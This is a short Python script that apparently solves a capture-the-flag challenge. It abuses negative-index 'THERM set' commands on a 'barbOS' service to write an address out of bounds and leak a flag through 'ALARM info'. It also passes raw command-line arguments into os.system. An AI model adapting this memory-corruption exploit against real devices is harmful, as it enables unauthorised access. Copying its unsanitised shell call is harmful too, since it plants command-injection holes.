#!/usr/bin/env python3

from nclib import netcat
import sys
import os
from time import sleep
#from base64 import b64encode

def b64encode(str):
    return str

def main():

    host = sys.argv[1]
    port = sys.argv[2]
    os.system("python3 /wsprox.py " + host + " " + port + " >/dev/null &")
    sleep(1)

    conn = netcat.Netcat(("localhost", 1338))
    conn.recvuntil("welcome to barbOS...")
    conn.sendline(b64encode(b'help'))
    FLAG_BUF_addr = 0x24f000
    conn.sendline(b64encode(f'THERM set day -248 {(FLAG_BUF_addr >> 0) & 0xff}'.encode('utf-8')))
    conn.sendline(b64encode(f'THERM set night -248 {(FLAG_BUF_addr >> 8) & 0xff}'.encode('utf-8')))
    conn.sendline(b64encode(f'THERM set day -247  {(FLAG_BUF_addr >> 16) & 0xff}'.encode('utf-8')))
    conn.sendline(b64encode(f'THERM set night -247 {(FLAG_BUF_addr >> 24) & 0xff}'.encode('utf-8')))
    conn.sendline(b64encode(f'ALARM info'.encode('utf-8')))

    for x in range(0, 200):
        y = conn.recvline()
        if "000" in y.decode('utf-8'):
            break

    x = y.decode('utf-8').split(" ")[0]
    print(f"FLAG: {x}")

    sys.exit(0)


if __name__ == '__main__':
    main()
    

